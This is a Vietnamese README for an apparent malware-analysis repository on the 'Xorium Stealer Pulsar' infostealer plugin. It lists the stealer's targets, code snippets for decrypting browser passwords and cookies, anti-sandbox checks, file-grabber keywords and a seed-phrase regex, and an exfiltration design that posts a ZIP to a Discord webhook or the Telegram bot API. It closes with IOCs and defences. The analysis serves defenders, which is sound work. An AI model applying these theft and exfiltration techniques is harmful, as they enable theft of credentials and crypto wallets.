# Xorium Stealer Pulsar - Phân tích Mã độc cho Mục đích Nghiên cứu

> ⚠️ **CẢNH BÁO PHÁP LÝ**: Repository này chứa mã độc (malware) đã được decompile. Nội dung này được cung cấp **CHỈ** cho mục đích nghiên cứu, phân tích và giáo dục an ninh mạng. Việc sử dụng mã này cho mục đích bất hợp pháp là **NGHIÊM CẤM** và có thể dẫn đến truy tố hình sự.

**[🇬🇧 English Version](README_EN.md)** | **[📊 Báo cáo Kỹ thuật](REPORT.md)** | **[🛡️ Phân tích Điểm yếu](DEFENSIVE_ANALYSIS.md)**

---

## 📑 Mục lục Tài liệu

| Tài liệu | Mô tả | Đối tượng |
|----------|-------|-----------|
| **README.md** (hiện tại) | Tổng quan, cấu trúc, targets | Tất cả |
| **README_EN.md** | English version của README | Tất cả |
| **REPORT.md** | [Báo cáo kỹ thuật sâu 893 dòng →](REPORT.md) | Malware Analyst |
| **DEFENSIVE_ANALYSIS.md** | [🛡️ Phân tích điểm yếu + YARA/Sigma rules →](DEFENSIVE_ANALYSIS.md) | **Blue Team, SOC, IR** |

---

## 📋 Tổng quan

**Xorium Stealer Pulsar** là một plugin stealer (công cụ đánh cắp dữ liệu) được thiết kế để tích hợp với **Pulsar RAT** (Remote Access Trojan) - một framework điều khiển từ xa. Plugin này được phát triển bởi `@aesxor` và có khả năng thu thập dữ liệu nhạy cảm từ máy nạn nhân.

### Thông tin kỹ thuật
- **Tên**: Xorium Stealer Pulsar
- **Phiên bản**: 2.1.0 (Client), 2.0.0 (Server)
- **Ngôn ngữ**: C# (.NET Framework 4.7.2)
- **Kiến trúc**: Plugin-based cho Pulsar RAT
- **Tác giả**: @aesxor

---

## 🏗️ Kiến trúc Hệ thống

Dự án được chia thành 2 thành phần chính:

```
Xorium Stealer Pulsar/
├── Pulsar.Plugin.Client/          # Client - Mã độc chạy trên máy nạn nhân
│   └── Stealer.Client/
│       ├── Intelix/Targets/       # Các module thu thập dữ liệu
│       └── Pulsar/Plugins/Client/ # Entry point plugin
│
└── Pulsar.Plugin.Server/          # Server - Plugin điều khiển cho Pulsar RAT
    └── Stealer.Server/
        └── Pulsar/Plugins/Server/ # Entry point server plugin
```

### Luồng hoạt động

1. **Server Plugin** (`Stealer.Server.dll`) được tải vào Pulsar RAT
2. Operator chọn client và gửi lệnh "Run Stealer"
3. Server đẩy `Stealer.Client.dll` xuống máy nạn nhân
4. Client thực thi, thu thập dữ liệu và gửi về qua:
   - Discord Webhook
   - Telegram Bot API
   - Trực tiếp về Pulsar Server

---

## 🎯 Các Mục tiêu Thu thập (Targets)

### 1. 🌐 Trình duyệt (Browsers)
| Loại | Trình duyệt được hỗ trợ |
|------|------------------------|
| **Chromium-based** | Chrome, Edge, Brave, Opera, Vivaldi, Yandex, Chromium |
| **Gecko-based** | Firefox, Waterfox, Pale Moon, SeaMonkey |

**Dữ liệu thu thập:**
- Lịch sử duyệt web
- Cookies (bao gồm session cookies)
- Saved passwords (giải mã từ DPAPI)
- Credit cards (giải mã)
- AutoFill data
- Tokens xác thực

### 2. 💬 Ứng dụng Nhắn tin (Messengers)
- **Discord** - Tokens, user data
- **Telegram** - Session files, settings
- **Signal** - Cấu hình, dữ liệu local
- **Skype** - Credentials, lịch sử
- **Viber** - Session data
- **Element (Riot.im)** - Cấu hình
- **ICQ** - User data
- **Pidgin** - Account settings
- **Tox** - Profile data
- **Outlook** - Email credentials
- **MicroSIP** - VoIP settings
- **Jabber** - IM credentials

### 3. 🎮 Nền tảng Game
| Game | Dữ liệu thu thập |
|------|-----------------|
| **Steam** | Login credentials, session files, config |
| **Epic Games** | Account data, session |
| **Battle.net** | Credentials, game configs |
| **Riot Games** (Valorant, LoL) | Session tokens |
| **Roblox** | Cookies, login data |
| **Minecraft** | Session files, credentials |
| **Uplay (Ubisoft)** | Login data |
| **Xbox** | Account credentials |
| **Growtopia** | Save data |
| **Electronic Arts** | Session, credentials |

### 4. 🔐 VPN Clients
- NordVPN, ExpressVPN, ProtonVPN
- CyberGhost, Mullvad, PIA (Private Internet Access)
- OpenVPN, WireGuard, SoftEther
- Hamachi, RadminVPN, SurfShark
- IPVanish, HideMyName, Cisco AnyConnect
- Proxifier

### 5. 💰 Ví Tiền điện tử (Crypto Wallets)

**Desktop Wallets:**
- Bitcoin Core, Electrum, Exodus
- Ethereum (keystore files)
- Atomic Wallet, Coinomi, Guarda
- Jaxx, Armory, Zcash
- Bytecoin, Dash Core
- Tari Universe

**Browser Extension Wallets:**
- MetaMask, Phantom, Trust Wallet
- Coinbase Wallet, Binance Wallet
- Ronin Wallet, Brave Wallet
- TronLink, Yoroi, Nami
- Math Wallet, XDEFI, Guarda
- Equal, BitAppWallet, iWallet
- Wombat, AtomicNFT, MewCx
- GuildWallet, Saturn, Ronin

### 6. 🖥️ Thông tin Hệ thống (Device)
- **SystemInfo** - OS version, hardware specs, username, hostname
- **ScreenShot** - Chụp màn hình desktop
- **ProcessDump** - Danh sách process đang chạy
- **ProductKey** - Windows product key
- **WifiKey** - WiFi passwords đã lưu
- **InstalledPrograms** - Danh sách phần mềm đã cài
- **InstalledBrowsers** - Danh sách trình duyệt

### 7. 🛠️ Ứng dụng Khác (Applications)

**Remote Access:**
- AnyDesk, TeamViewer, RDP
- RDCMan, Sunlogin, MobaXterm
- Xmanager, PuTTY

**FTP/SCP Clients:**
- FileZilla, WinSCP, CyberDuck
- CoreFTP, FTPNavigator, FTPRush
- FTPGetter, FTPCommander, TotalCommander

**Development/DevOps:**
- JetBrains IDEs (config, licenses)
- GitHub Desktop, Ngrok
- Navicat, No-IP, DynDNS
- OBS, TeamSpeak, PlayIt

---

## 🔧 Cơ chế Kỹ thuật

### Giải mã DPAPI (Data Protection API)
```csharp
// Trích xuất Master Key từ Local State
byte[] masterv10 = LocalState.MasterKeyV10(localstate);
byte[] masterv20 = LocalState.MasterKeyV20(localstate);
```

Mã độc sử dụng DPAPI để giải mã dữ liệu đã mã hóa của trình duyệt:
- Passwords được lưu trong `Login Data` SQLite database
- Cookies trong `Cookies` hoặc `Network/Cookies`
- Credit cards trong `Web Data`

### SQLite Database Parsing
Sử dụng custom SQLite parser để đọc dữ liệu từ các file database của trình duyệt mà không cần lock file.

### Parallel Processing
```csharp
Task.WaitAll(Task.Run(() => Parallel.ForEach<ITarget>(
    Stealer.Targets, 
    target => target.Collect(zip, counter)
)));
```

Sử dụng parallel processing để tăng tốc độ thu thập dữ liệu.

### Exfiltration (Đưa dữ liệu ra ngoài)

**Discord Webhook:**
```csharp
POST {webhookUrl}
Content-Type: multipart/form-data
- payload_json: Embed message với thông tin victim
- file: ZIP archive chứa dữ liệu đánh cắp
```

**Telegram Bot API:**
```csharp
POST https://api.telegram.org/bot{token}/sendDocument
- chat_id: {chatId}
- caption: Log metadata
- document: ZIP file
```

---

## 📊 Cấu trúc Output

Dữ liệu được đóng gói thành file ZIP với cấu trúc:

```
{Username}_{ComputerName}_{YYYYMMDD}.zip
├── Browsers/
│   ├── Chrome/
│   │   ├── Passwords.txt
│   │   ├── Cookies.txt
│   │   ├── History.txt
│   │   └── CreditCards.txt
│   └── Firefox/
│       └── ...
├── Messengers/
│   ├── Discord/
│   ├── Telegram/
│   └── ...
├── Games/
│   ├── Steam/
│   ├── Epic/
│   └── ...
├── Wallets/
│   ├── Exodus/
│   ├── Electrum/
│   └── ...
├── VPN/
│   └── ...
├── Applications/
│   └── ...
├── System/
│   ├── SystemInfo.txt
│   ├── WiFiPasswords.txt
│   ├── InstalledPrograms.txt
│   └── Screenshot.png
└── counter.txt  # Summary statistics
```

---

## 🛡️ Anti-VM & Anti-Sandbox

Mã độc sử dụng nhiều kỹ thuật để phát hiện và tránh chạy trong môi trường ảo hóa (VM) hoặc sandbox:

### Các kỹ thuật Anti-Analysis

| Kỹ thuật | Mô tả | Điều kiện phát hiện |
|----------|-------|---------------------|
| **Processor Count Check** | Kiểm tra số lượng CPU cores | `Environment.ProcessorCount <= 1` |
| **Debugger Detection** | Phát hiện debugger đang attach | `Debugger.IsAttached` |
| **Memory Check** | Kiểm tra RAM tổng | RAM < 2GB |
| **Drive Space Check** | Kiểm tra dung lượng ổ C | < 50GB |
| **Cache Memory Check** | Kiểm tra Win32_CacheMemory | Không có cache memory |
| **CIM Memory Check** | Kiểm tra CIM_Memory | Không có CIM memory |
| **Process Name Check** | Kiểm tra tên process | Chứa từ "sandbox" |
| **User/Machine Check** | Kiểm tra username và hostname | Các pattern đặc biệt |

### Các pattern User/Machine bị phát hiện

```csharp
// Windows Defender Application Guard
username == "WDAGUtilityAccount"

// Các pattern sandbox phổ biến
(username == "frank" && hostname.Contains("desktop"))
(username == "robert" && hostname.Contains("22h2"))
```

### Hành vi khi phát hiện VM/Sandbox

```csharp
public static void CheckOrExit()
{
    if (ProccessorCheck()) throw new Exception();
    if (CheckDebugger()) throw new Exception();
    if (CheckMemory()) throw new Exception();
    if (CheckDriveSpace()) throw new Exception();
    if (CheckUserConditions()) throw new Exception();
    if (CheckCache()) throw new Exception();
    if (CheckFileName()) throw new Exception();
    if (CheckCim()) throw new Exception();
}
```

Khi phát hiện bất kỳ điều kiện nào, mã độc sẽ throw exception và dừng thực thi ngay lập tức.

---

## 🔐 Phân tích Cơ chế Mã hóa & Giải mã Chi tiết

### 1. DPAPI (Data Protection API)

Sử dụng `CryptUnprotectData` từ `Crypt32.dll` để giải mã dữ liệu được bảo vệ bởi Windows:

```csharp
[DllImport("crypt32.dll", SetLastError = true)]
public static extern bool CryptUnprotectData(
    ref DataBlob pDataIn,
    ref string szDataDescr,
    ref DataBlob pOptionalEntropy,
    IntPtr pvReserved,
    ref CryptprotectPromptstruct pPromptStruct,
    int dwFlags,
    ref DataBlob pDataOut);
```

### 2. AES-GCM-256 (Chromium v10/v20)

Giải mã password Chrome/Edge sử dụng AES-GCM với master key từ Local State:

```csharp
// Cấu trúc encrypted data
[0-2]   : "v10" hoặc "v20" (version prefix)
[3-14]  : 12-byte nonce/IV
[15-n]  : ciphertext
[n-16:n]: 16-byte authentication tag

// Giải mã
byte[] decrypted = AesGcm256.Decrypt(masterKey, nonce, aad, ciphertext, tag);
```

### 3. ChaCha20-Poly1305

Hỗ trợ giải mã ChaCha20-Poly1305 cho các trình duyệt mới:

```csharp
public static byte[] Decrypt(byte[] key32, byte[] iv12, byte[] ciphertext, byte[] tag, byte[] aad)
{
    // Key: 32 bytes
    // IV: 12 bytes  
    // Tag: 16 bytes (Poly1305 MAC)
    // Sử dụng constant-time comparison để tránh timing attacks
}
```

### 4. TripleDES-CBC (Firefox/Gecko)

Giải mã password Firefox sử dụng 3DES-CBC với master key từ key4.db/key3.db:

```csharp
// Parse ASN.1 structure
Asn1DerObject asn1Object = asn1Der.Parse(encryptedData);
byte[] iv = asn1Object.Objects[0].Objects[1].Objects[0].Data;
byte[] ciphertext = asn1Object.Objects[0].Objects[1].Objects[1].Data;

// Decrypt using TripleDES-CBC
string plaintext = TripleDes.DecryptStringDesCbc(masterKey, ciphertext, iv);
```

### 5. NSS Decryptor (Firefox Legacy)

Sử dụng NSS (Network Security Services) library để giải mã legacy Firefox data:

```csharp
if (!NSSDecryptor.Initialize(profile))
    return;
string decrypted = NSSDecryptor.Decrypt(encryptedString);
```

---

## 🗄️ SQLite Parser Tùy chỉnh

Mã độc triển khai **custom SQLite parser** thay vì sử dụng thư viện chuẩn, giúp đọc database mà không cần lock file:

### Cấu trúc Parser

```csharp
public class SqLite
{
    private readonly byte[] _fileBytes;
    private readonly ulong _pageSize;
    private readonly ulong _dbEncoding;
    private SqliteMasterEntry[] _masterTableEntries;
    private TableEntry[] _tableEntries;
    
    public SqLite(byte[] basedata)
    {
        _fileBytes = basedata;
        _pageSize = ConvertToULong(16, 2);    // Page size at offset 16
        _dbEncoding = ConvertToULong(56, 4);  // Encoding at offset 56
        ReadMasterTable(100L);                // Start at offset 100
    }
}
```

### Các Table được đọc

| Database File | Tables | Dữ liệu |
|--------------|--------|---------|
| `Login Data` | `logins` | Username, password, URL |
| `Cookies` | `cookies` | Name, value, domain, path |
| `Web Data` | `autofill` | Form data, addresses |
| `Web Data` | `credit_cards` | Card number, expiry, name |
| `Web Data` | `token_service` | OAuth tokens |
| `Ya Passman Data` | `logins` | Yandex passwords |
| `Ya Credit Cards` | `records` | Yandex credit cards |

---

## 📁 File Grabber & Seed Phrase Hunter

Module `Grabber` tìm kiếm file chứa thông tin nhạy cảm trên toàn bộ hệ thống:

### Keywords tìm kiếm (35 từ khóa)

```csharp
private readonly string[] _keywords = new string[35]
{
    "password", "passwd", "pwd", "pass", "login", "user", "username",
    "account", "mail", "email", "secret", "key", "private", "public",
    "wallet", "mnemonic", "seed", "recovery", "phrase", "backup",
    "pin", "auth", "2fa", "token", "apikey", "api_key", "ssh",
    "cert", "certificate", "crypto", "btc", "eth", "usdt", "ltc", "xmr"
};
```

### Seed Phrase Regex Pattern

```csharp
// Tìm seed phrase 12-24 từ (BIP-39)
private readonly Regex _seedRegex = new Regex(
    "^(?:\\s*\\b[a-z]{3,}\\b){12,24}\\s*$",
    RegexOptions.IgnoreCase | RegexOptions.Multiline | RegexOptions.Compiled);
```

### File Extensions được quét

```csharp
private readonly string[] _seedExtensions = new string[9]
{
    ".seed", ".seedphrase", ".mnemonic", ".phrase", ".key",
    ".secret", ".txt", ".backup", ".wallet"
};
```

### Đường dẫn tìm kiếm (19 locations)

- Desktop, Documents, Downloads
- OneDrive, Dropbox, iCloud Drive, Google Drive, YandexDisk, Mega
- Evernote, Standard Notes, Joplin
- Wallets, Keys, Crypto, Backup folders

### Giới hạn kích thước

```csharp
private readonly long _sizeMinFile = 120;      // Min: 120 bytes
private readonly long _sizeLimitFile = 6144;   // Max per file: 6KB
private readonly long _sizeLimit = 5242880;    // Total: 5MB
```

---

## 🌐 Danh sách Trình duyệt Đầy đủ (84+ Browsers)

### Chromium-based (66 browsers)

| # | Browser | Path |
|---|---------|------|
| 1 | Google Chrome | `\Google\Chrome\User Data` |
| 2 | Microsoft Edge | `\Microsoft\Edge\User Data` |
| 3 | Brave | `\BraveSoftware\Brave-Browser\User Data` |
| 4 | Opera | `\Opera Software\Opera Stable` |
| 5 | Opera GX | `\Opera Software\Opera GX Stable` |
| 6 | Vivaldi | `\Vivaldi\User Data` |
| 7 | Yandex | `\Yandex\YandexBrowser\User Data` |
| 8 | CocCoc | `\CocCoc\Browser\User Data` |
| 9 | 360Chrome | `\360Chrome\Chrome\User Data` |
| 10 | 360Browser | `\360Browser\Browser\User Data` |
| 11 | CentBrowser | `\CentBrowser\User Data` |
| 12 | Comodo Dragon | `\Comodo\Dragon\User Data` |
| 13 | Epic Privacy | `\Epic Privacy Browser\User Data` |
| 14 | Avast Browser | `\AVAST Software\Browser\User Data` |
| 15 | CCleaner | `\CCleaner Browser\User Data` |
| 16 | Torch | `\Torch\User Data` |
| 17 | Uran | `\uCozMedia\Uran\User Data` |
| 18 | Iridium | `\Iridium\User Data` |
| 19 | Maxthon | `\Maxthon\User Data` |
| 20 | Slimjet | `\Slimjet\User Data` |
| ... | 46+ others | Various paths |

### Gecko-based (18 browsers)

| # | Browser | Path |
|---|---------|------|
| 1 | Firefox | `\Mozilla\Firefox\Profiles` |
| 2 | Waterfox | `\Waterfox\Profiles` |
| 3 | Thunderbird | `\Thunderbird\Profiles` |
| 4 | Pale Moon | `\Moonchild Productions\Pale Moon\Profiles` |
| 5 | SeaMonkey | `\Mozilla\SeaMonkey\Profiles` |
| 6 | K-Meleon | `\K-Meleon\Profiles` |
| 7 | IceDragon | `\Comodo\IceDragon\Profiles` |
| 8 | Cyberfox | `\8pecxstudios\Cyberfox\Profiles` |
| 9 | BlackHawk | `\NETGATE Technologies\BlackHawk\Profiles` |
| 10 | Mypal | `\Mypal\Profiles` |
| ... | 8+ others | Various paths |

---

## ⚙️ Windows API Sử dụng

### Process & Memory APIs

```csharp
[DllImport("psapi.dll")]
public static extern bool GetProcessMemoryInfo(...);  // Memory stats

[DllImport("psapi.dll")]
public static extern bool EnumProcesses(...);           // List processes

[DllImport("kernel32.dll")]
public static extern IntPtr OpenProcess(...);           // Open process handle

[DllImport("kernel32.dll")]
public static extern bool TerminateProcess(...);        // Kill process
```

### DPAPI & Cryptography APIs

```csharp
[DllImport("crypt32.dll")]
public static extern bool CryptUnprotectData(...);      // Decrypt DPAPI

[DllImport("ncrypt.dll")]
public static extern int NCryptOpenStorageProvider(...);// CNG provider

[DllImport("ncrypt.dll")]
public static extern int NCryptDecrypt(...);            // CNG decrypt
```

### System Information APIs

```csharp
[DllImport("kernel32.dll")]
public static extern bool GetVolumeInformation(...);    // Volume info

[DllImport("kernel32.dll")]
public static extern bool GlobalMemoryStatusEx(...);    // Memory status

[DllImport("user32.dll")]
public static extern bool EnumDisplayDevices(...);      // Display info
```

---

## 📊 Cấu trúc Báo cáo (counter.txt)

File `counter.txt` được tạo trong ZIP archive với cấu trúc:

```
    ____      __       _______  __
   /  _/___  / /____  / /  _/ |/ /
   / // __ \/ __/ _ \/ // / |   / 
 _/ // / / / /_/  __/ // / /   |  
/___/_/ /_/\__/\___/_/___//_/|_|  
                                   
               InteliX by dead artis

[Keys]  [--3--]  [Chrome, Edge, Firefox]
       [Chrome Profile 1] MasterKey_v10: A1B2C3D4...
       [Edge Default] MasterKey_v20: E5F6G7H8...
       [Firefox default] MasterKey_NSS: I9J0K1L2...

[Browsers]  [--2--]  [Chrome, Firefox]
  - Profile 1
       [Cookies 156]
       [Passwords 23]
       [CreditCards 2]
       [AutoFill 45]
       [RestoreToken 3]

[Applications]  [--5--]  [Discord, FileZilla, Telegram, Steam, NordVPN]
     [Name Discord]
       - tokens.txt
       - Local Storage/leveldb/000003.log

[Games]  [--2--]  [Steam, Minecraft]
     [Name Steam]
       - config/loginusers.vdf
       - config/config.vdf

[Messangers]  [--3--]  [Telegram, Discord, Signal]
     [Name Telegram]
       - tdata/key_datas
       - tdata/settings

[Vpns]  [--1--]  [NordVPN]
     [Name NordVPN]
       - config.xml
       - user.config

[CryptoChromium]  [--2--]
       - MetaMask
       - Phantom

[CryptoDesktop]  [--3--]  [Exodus, Electrum, Atomic]
     [Exodus]
       - exodus.wallet/seed.seco
     [Electrum]
       - wallets/default_wallet
     [Atomic]
       - Local Storage/leveldb/000005.ldb

[FilesGrabber]  [--15--]
       - Desktop/backup.txt
       - Documents/wallet.key
       - Downloads/seed.txt
```

---

## 🛡️ Phòng chống & Phát hiện

### IOCs (Indicators of Compromise)

**File Paths:**
- `%APPDATA%\pulsar_cl_conf.bin` - Config file lưu webhook/token
- `%TEMP%\*.zip` - Temporary archive files

**Registry Keys:**
- Các key liên quan đến startup persistence

**Network Indicators:**
- Discord webhook URLs: `discord.com/api/webhooks/*`
- Telegram API: `api.telegram.org/bot*/sendDocument`

### Biện pháp Phòng ngừa

1. **Sử dụng Password Manager** - Không lưu password trong trình duyệt
2. **Tắt AutoFill** - Vô hiệu hóa tính năng điền tự động
3. **2FA/MFA** - Bật xác thực 2 yếu tố cho tất cả tài khoản
4. **Endpoint Protection** - Sử dụng EDR/AV hiện đại
5. **Application Control** - Chặn thực thi file không rõ nguồn gốc
6. **Network Monitoring** - Giám sát traffic đến Discord/Telegram APIs

---

## 🔬 Phân tích Reverse Engineering

### Công cụ Phân tích
- **JetBrains dotPeek** / **dnSpy** - Decompile .NET assemblies
- **ILSpy** - Open-source .NET decompiler
- **Detect It Easy (DIE)** - Xác định packer/compiler
- **PEStudio** - Static analysis PE files

### Anti-Analysis Techniques
- **Costura.Fody** - Nhúng dependencies vào assembly chính
- **Obfuscation** - Mã hóa string, rename symbols
- **Compressed DLLs** - Nén thư viện trong resources

---

## 📚 Tài liệu Tham khảo

### Về DPAPI
- [Microsoft DPAPI Documentation](https://docs.microsoft.com/en-us/windows/win32/seccng/cng-dpapi)
- [Chrome Password Decryption](https://www.hackingarticles.in/forensic-investigation-of-stored-password-in-chrome/)

### Về SQLite Forensics
- [Browser Forensics](https://www.sans.org/blog/browser-forensics/)
- [Chrome Forensics](https://forensicswiki.xyz/page/Google_Chrome)

### Về Pulsar RAT
- Pulsar là một Remote Access Trojan framework phổ biến trong cộng đồng cybercrime

---

## ⚖️ Disclaimer

Repository này được cung cấp cho mục đích **GIÁO DỤC VÀ NGHIÊN CỨU**:

- ✅ Phân tích malware để hiểu cách thức hoạt động
- ✅ Phát triển biện pháp phòng ngừa và phát hiện
- ✅ Đào tạo nhân viên an ninh mạng
- ✅ Nghiên cứu academic về cybersecurity

**KHÔNG ĐƯỢC:**
- ❌ Sử dụng để tấn công hệ thống không có quyền
- ❌ Phân phối với mục đích gây hại
- ❌ Sử dụng cho mục đích thương mại bất hợp pháp

---

## 👤 Tác giả Phân tích

Phân tích này được thực hiện bởi nhà phân tích mã độc độc lập cho mục đích nghiên cứu an ninh mạng.

**Ngày phân tích**: 2026-01-31  
**Phiên bản phân tích**: 1.0

---

## 📞 Liên hệ

Nếu bạn phát hiện mã độc này trong hệ thống của mình:
1. Ngắt kết nối internet ngay lập tức
2. Sử dụng công cụ antivirus để quét toàn bộ hệ thống
3. Thay đổi tất cả mật khẩu từ máy tính khác
4. Kiểm tra các ứng dụng crypto và di chuyển tài sản nếu cần
5. Liên hệ chuyên gia an ninh mạng

---

*"Hiểu kẻ thù để bảo vệ chính mình"*
